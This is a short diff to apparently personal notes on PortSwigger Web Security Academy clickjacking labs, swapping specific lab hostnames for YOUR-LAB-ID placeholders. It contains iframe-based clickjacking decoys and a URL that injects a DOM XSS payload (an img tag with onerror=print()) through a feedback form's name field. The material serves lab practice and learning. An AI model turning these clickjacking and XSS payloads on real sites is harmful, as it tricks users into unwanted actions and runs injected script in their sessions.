@@ -79,7 +79,7 @@ Clickjacking with DOM XSS
     }
     </style>
 <div>Click me</div> // Needed to say click me not test me
-<iframe src="https://0a28005703ff34e68245517f00ea001b.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=asdf@asdf.asdf&subject=test&message=test"></iframe>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=asdf@asdf.asdf&subject=test&message=test"></iframe>
 
     Multistep Clickjacking
 
@@ -106,5 +106,5 @@ Clickjacking with DOM XSS
     </style>
 <div class="div1">Click me first</div> 
 <div class="div2">Click me next</div>
-<iframe src="https://0aea005204bb9b7b83d30f7f004f00d0.web-security-academy.net/my-account"></iframe>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
 ```
